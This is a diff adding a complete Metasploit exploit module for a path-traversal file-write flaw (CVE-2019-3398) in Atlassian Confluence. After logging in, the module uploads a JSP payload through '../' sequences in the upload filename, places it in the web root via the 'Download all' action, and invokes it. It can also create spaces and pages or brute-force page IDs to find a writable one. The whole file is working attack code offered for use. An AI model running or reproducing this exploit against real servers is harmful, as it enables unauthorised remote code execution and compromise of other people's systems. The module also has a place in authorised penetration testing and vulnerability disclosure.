@@ -1,0 +1,398 @@
+# Exploit Title: Atlassian Confluence 6.15.1 - Directory Traversal (Metasploit)
+# Google Dork: N/A
+# Date: 2019-11-11
+# Exploit Author: max7253
+# Vendor Homepage: https://www.atlassian.com
+# Software Link: https://www.atlassian.com/software/confluence/download-archives
+# Version: 6.15.1
+# Tested on: Microsoft Windows 7 Enterprise, 6.1.7601 Service Pack 1 Build 7601, Linux 5.0.0-23-generic #24~18.04.1-Ubuntu
+# CVE : N/A
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+include Msf::Exploit::Remote::HttpClient
+
+def initialize(info={})
+	super(update_info(info,
+	'Name'			=> "Confluence Arbitrary File Write via Path Traversal (CVE-2019-3398)",
+	'Description'		=> %q{
+	To use this exploit you should specify the following variables:
+	USERNAME and PASSWORD - the login/password to log into the web interface of the Atlassian Confluence server.
+	ROOTFOLDER - the root directory of the web server. If the root directory is located in C:\confluence\pages\, set this variable to ROOTFOLDER = 'confluence/pages/'.
+	Typical ROOTFOLDER locations are:
+	Windows: Program Files/Atlassian/Confluence/confluence/pages/
+	Linux: opt/atlassian/confluence/confluence/pages/
+	Note that the root directory of the web server and the temporary directory of the Atlassian Confluence server on Windows must be on the same drive (C:\ in the example above).
+	PAGEID - the pageId URL parameter you see in the browser address bar when you vist the Atlassian Confluence page where you have rights to upload files.
+	For example, https://server.net/pages/viewpageattachments.action?pageId=111111111&metadataLink=true.
+	If PAGEID is set to 0, the script will try to create a new Page ID. If it fails, it will try to create a new space and create a Page ID there.
+	If PAGEID is not specified, the script will walk though the PAGEID_RANGE_START..PAGEID_RANGE_END range.
+	The script gets authenticated to the Atlassian Confluence server, retrieves the ATLASSIAN TOKEN from the server response, uploads the shellcode, then imitates the 'Download all' action to place the shellcode to the root directory of the web server.
+	Tested on Atlassian v6.15.1. on Linux and Windows.
+	Note that on Linux Confluence runs under the 'confluence' account which may not have rights to save files in the root directory of the web server. In this case the exploit will fail. Also, to create a new space and get the list of existing spaces the script makes use of Confluence REST API, which is available starting from Confluence Server 5.5.
+	},
+	'License'			=> MSF_LICENSE,
+	'Author'			=>
+	[
+		'Maxim Guslyaev'      # Metasploit module
+	],
+	'References'		=>
+	[
+		[ 'CVE', '2019-3398' ],
+		[ 'URL', 'https://confluence.atlassian.com/doc/confluence-security-advisory-2019-04-17-968660855.html' ],
+		[ 'URL', 'https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181'],
+		[ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2019-3398']
+	],
+	'Privileged'		=> false,
+	'Platform'		=> %w{ linux win },
+	'Targets'			=>
+	[
+		[ 'Windows', { 'Platform' => 'win',   'Arch' => ARCH_JAVA  }],
+		[ 'Linux',   { 'Platform' => 'linux', 'Arch' => ARCH_JAVA  }]
+	],
+	'DefaultOptions'	=>
+	{
+		'RPORT' => 8090,
+		'SSL' => false
+	},
+	'DisclosureDate' => 'Nov 9 2019',
+	'DefaultTarget'  => 0
+	))
+
+	register_options(
+	[
+		OptString.new('USERNAME', [true, 'The login to log into the web interface of the Atlassian Confluence server', 'test']),        
+		OptString.new('PASSWORD', [true, 'The password to log into the web interface of the Atlassian Confluence server', 'test']),
+		OptString.new('ROOTFOLDER', [true, 'The root folder of the Atlassian Confluence server', 'Program Files/Atlassian/Confluence/confluence/pages/']),
+		#OptString.new('ROOTFOLDER', [true, 'The root folder of the Atlassian Confluence server', 'opt/atlassian/confluence/confluence/pages/']),
+		OptString.new('FILENAME', [true, 'The JSP shellcode file name', 'covfefe.jsp']),
+		OptString.new('TARGETURI', [true, 'The base to Confluence', '/']),
+		OptString.new('NEWSPACE', [false, 'A new space to be created', 'TESTSPACE432545645']),
+		OptInt.new('PAGEID', [false, 'A Page ID to be used to upload shellcode', 0]),
+		OptInt.new('PAGEID_RANGE_START', [false, 'The first Page ID to be used to enumerate a writable Page ID (used when PAGEID is not specified)', '1']),
+		OptInt.new('PAGEID_RANGE_END', [false, 'The last Page ID to be used to enumerate a writable Page ID (used when PAGEID is not specified)', '999999999']),
+		
+	], self.class)
+end
+
+def do_authenticate
+	print_status("Sending POST request to the web application (authentication)...")
+	res = send_request_cgi({
+		'uri'              => normalize_uri(target_uri.path.to_s, '/dologin.action'),
+		'method'           => 'POST',
+		'vars_post'        => {
+		'os_username'    => datastore['USERNAME'],
+		'os_password'    => datastore['PASSWORD'],
+		'os_destination' => '',
+		'login'          => 'Log+In'
+					}
+			})
+	if res.nil?
+		print_status("Unable to access the web application!")
+		return 0
+	end
+	@sessid = get_sid(res)
+	if @sessid.nil?
+		print_status("Unable to retrieve session ID!")
+		return 0
+	end
+	print_status("Getting Session ID from the web application... #{@sessid}")
+	
+	if res && res.redirect?
+		location = res.redirection
+		if location.nil?
+			print_status("Unable to access the web application when redirected!")
+			return 0
+		end
+		res = send_request_cgi!({
+		'uri'              => normalize_uri(target_uri.path.to_s, location.to_s),
+		'method'           => 'GET',
+		'headers'       => {
+		'Cookie'           => @sessid
+					}
+			}, redirect_depth = 5)
+	end
+
+	if res && res.code == 200
+		if res.body =~ /re-enter\syour\slogin/ || res.body =~ /Sorry,\syour\susername\sand\/or\spassword\sare\sincorrect/ || res.body =~ /Unauthorized/
+			print_status("Authentication failed...")
+			return 0
+		end
+
+		@xsrf_token = res.get_html_document.at('meta[@id="atlassian-token"]')['content']
+		if @xsrf_token.nil? or @xsrf_token.blank?
+			print_status("Failed to retrieve XSRF token...")
+			return 0
+		else
+			print_status("Retrieving XSRF token... #{@xsrf_token}")
+			return 1
+		end
+	else
+		print_status("Unexpected response from the web application...")
+		return 0
+	end
+end
+
+def do_upload(_pageid)
+	print_status("Sending POST request to the web application (shellcode upload)...")
+	res = send_request_cgi({
+		'uri'			=> normalize_uri(target_uri.path.to_s, '/plugins/drag-and-drop/upload.action'),
+		'method'		=> 'POST',
+		'vars_get'		=> {
+		'pageId'		=> _pageid,
+		'filename'		=> '../../../../../../../../../../' + datastore['ROOTFOLDER'] + datastore['FILENAME'],
+		'size'			=> payload.encoded.length,
+		'mimeType'		=> 'text/plain',
+		'spaceKey'		=> 'isis',
+		'atl_token'		=> @xsrf_token,
+		'name'			=> datastore['FILENAME']
+		},
+		'data'			=> payload.encoded,
+		'headers'		=> {
+          	'Connection'		=> 'close',
+		'Accept'		=> '*/*',
+		'Accept-Encoding'	=> 'identity',
+          	'Cookie'		=> @sessid,
+		'Content-Length'	=> payload.encoded.length,
+		'Content-Type'		=> 'text/plain'
+		}
+		})
+	if res && res.code == 200 && res.body.scan(/actionErrors/).blank?
+		print_status("Shellcode uploaded...")
+		return 1
+	else
+		return 0
+	end
+end
+
+def do_downloadall(_pageid)
+	for downloadall_iter in 1..10
+		print_status("Sending GET request to the web application (downloadall)...")
+		res = send_request_cgi({
+			'uri'			=> normalize_uri(target_uri.path.to_s, '/pages/downloadallattachments.action'),
+			'method'		=> 'GET',
+			'vars_get'		=> {
+			'pageId'		=> _pageid
+			},
+			'headers'		=> {
+          		'Cookie'		=> @sessid
+			}
+			})
+		
+		print_status("Sending GET request to the web application (shellcode invokation)...")
+		res = send_request_cgi({
+			'uri'			=> normalize_uri(target_uri.path.to_s, '/pages/' + datastore['FILENAME']),
+			'method'		=> 'GET',
+			'headers'		=> {
+          		'Cookie'		=> @sessid
+			}
+			}, timeout = 10)
+
+		if res && res.code == 200
+			print_status("Shellcode found...")
+			return 1
+		else
+			if downloadall_iter == 10
+				print_status("Shellcode not found...")
+				return 0
+			end
+		end
+	end
+end
+
+def do_getspaces
+	print_status("Sending GET request to the web application (getting available spaces)...")
+		res = send_request_cgi({
+			'uri'			=> normalize_uri(target_uri.path.to_s, '/rest/api/space'),
+			'method'		=> 'GET',
+			'headers'		=> {
+			'User-Agent'		=> 'python-requests/2.20.0',
+        		'Cookie'		=> @sessid,
+			'Accept'		=> '*/*',
+			'Accept-Encoding'	=> 'identity',
+			'Content-Type'		=> 'application/json'
+			}
+			})
+
+		if res && res.code == 200 && res.body =~ /results/
+			space_list = res.body.scan(/\"key\":\"(\w+)\"/).flatten
+		else
+			space_list = Array([])
+		end
+	return space_list
+end
+
+def do_createspace
+	print_status("Sending POST request to the web application (creating a space)...")
+	res = send_request_cgi({
+	'uri'			=> normalize_uri(target_uri.path.to_s, '/rest/api/space'),
+	'method'		=> 'POST',
+	'data'			=> {
+		"key": datastore['NEWSPACE'],
+		"name": "Example space",
+		"description": {
+		"plain": {
+		"value": "This is an example space",
+		"representation": "plain"
+		}
+		},
+		"metadata": {}
+		}.to_json,
+	'headers'		=> {
+	'User-Agent'		=> 'python-requests/2.20.0',
+        'Cookie'		=> @sessid,
+	'Accept-Encoding'	=> 'identity',
+	'Content-Type'		=> 'application/json'
+	}
+	})
+
+	if res && res.code == 200 && res.body =~ /\"key\":\"\w+\"/
+		print_status("Space created...")
+		return res.body.scan(/\"key\":\"(\w+)\"/).flatten[0]
+	else
+		print_status("Space not created...")
+		return 0
+	end			
+end
+
+def do_createpage(_space)
+	print_status("Sending GET request to the web application (creating Page ID), space #{_space}...")
+	res = send_request_cgi({
+		'uri'			=> normalize_uri(target_uri.path.to_s, '/pages/createpage.action?spaceKey='+_space),
+		'method'		=> 'GET',
+		'headers'		=> {
+        	'Cookie'		=> @sessid
+		}
+		})
+	if res && res.code == 200 && res.body =~ /ajs-draft-id/
+		pageid = res.get_html_document.at('meta[@name="ajs-draft-id"]')['content']
+		pageid_parsed = /(\d+)/.match(pageid)
+		if pageid_parsed.nil?
+			print_status("Unexpected Page ID format...")
+			return 0
+		else
+			print_status("Page ID created... #{pageid}")
+			datastore['PAGEID'] = pageid
+			return 1
+		end
+	else
+		return 0
+	end
+end
+
+def get_sid(res)
+	if res.nil?
+		return ''
+	end
+	res.get_cookies.scan(/(JSESSIONID=\w+);*/).flatten[0] || ''
+end
+
+
+def exploit
+	print_status("Getting authenticated to the web application...")
+	if do_authenticate != 1
+		fail_with(Failure::Unknown, 'Initial access or authentication error!')
+	end
+	
+	unless datastore['PAGEID'].blank?
+		if datastore['PAGEID'] == 0
+			print_status("Creating Page ID...")
+			spaces = do_getspaces
+			for sp in spaces
+				if do_createpage(sp) == 1
+					print_status("Uploading shellcode...")
+					if do_upload(datastore['PAGEID']) != 1
+						print_status("Failed to upload shellcode...")
+						next
+					end					
+					print_status("Invoking shellcode...")
+					if do_downloadall(datastore['PAGEID']) != 1
+						print_status("Failed to invoke shellcode...")
+						next
+					else
+						return
+					end
+				end
+			end
+
+			print_status("Trying to create a new space...")
+			new_sp = do_createspace
+
+			if new_sp != 0
+				if do_createpage(new_sp) == 1
+					print_status("Uploading shellcode...")
+					if do_upload(datastore['PAGEID']) != 1
+						fail_with(Failure::Unknown, 'Error while uploading shellcode!')
+					end
+					print_status("Invoking shellcode...")
+					if do_downloadall(datastore['PAGEID']) != 1
+						fail_with(Failure::Unknown, 'Error while invoking shellcode!')				
+					end
+
+					return
+				else
+					fail_with(Failure::Unknown, 'Error while creating page in the newly created space!')
+				end
+			else
+				fail_with(Failure::Unknown, 'Error while creating space!')
+			end
+		end	
+			
+		print_status("Uploading shellcode...")
+		if do_upload(datastore['PAGEID']) != 1
+			fail_with(Failure::Unknown, 'Error while uploading shellcode!')
+		end
+		print_status("Invoking shellcode...")
+		if do_downloadall(datastore['PAGEID']) != 1
+			fail_with(Failure::Unknown, 'Error while invoking shellcode!')				
+		end
+	else
+		for id in datastore['PAGEID_RANGE_START']..datastore['PAGEID_RANGE_END']
+			print_status("Trying Page Id #{id}")
+			print_status("Uploading shellcode...")
+			if do_upload(id) == 1
+				print_status("Invoking shellcode...")
+				if do_downloadall(id) == 1
+					break
+				end
+			end
+		end
+	end
+
+end
+
+def check
+	res = send_request_cgi!({
+		'uri'			=> normalize_uri(target_uri.path.to_s, '/login.action?anon=1&logout=1'),
+		'method'		=> 'GET',
+		}, redirect_depth = 5)
+
+	if res && res.body =~ /Powered\sby/
+		ver = res.body.scan(/^.*Powered\sby\s.*(\d{1,}\.\d{1,}\.\d{1,}).*$/).flatten[0]
+		print_status("The version of the web application is #{ver}")
+		ver_parsed = /(\d+)\.(\d+)\.(\d+)/.match(ver.to_s)
+		if ver_parsed.nil?
+			print_status("The version of the web application couldn't be parsed")
+			return Exploit::CheckCode::Detected
+		end
+		ver_oct1 = ver_parsed[1].to_i
+		ver_oct2 = ver_parsed[2].to_i
+		ver_oct3 = ver_parsed[3].to_i
+		
+		if ver_oct1.between?(2, 6) && ver_oct2.between?(0, 6) && ver_oct3.between?(0, 12) || ver_oct1.between?(6, 6) && ver_oct2.between?(7, 12) && ver_oct3.between?(0, 3) || ver_oct1.between?(6, 6) && ver_oct2.between?(13, 13) && ver_oct3.between?(0, 3) || ver_oct1.between?(6, 6) && ver_oct2.between?(14, 14) && ver_oct3.between?(0, 2) || ver_oct1.between?(6, 6) && ver_oct2.between?(15, 15) && ver_oct3.between?(0, 1)
+			return Exploit::CheckCode::Appears
+		else
+			return Exploit::CheckCode::Safe		
+		end
+
+	else
+		return Exploit::CheckCode::Unknown
+	end
+end
+
+end
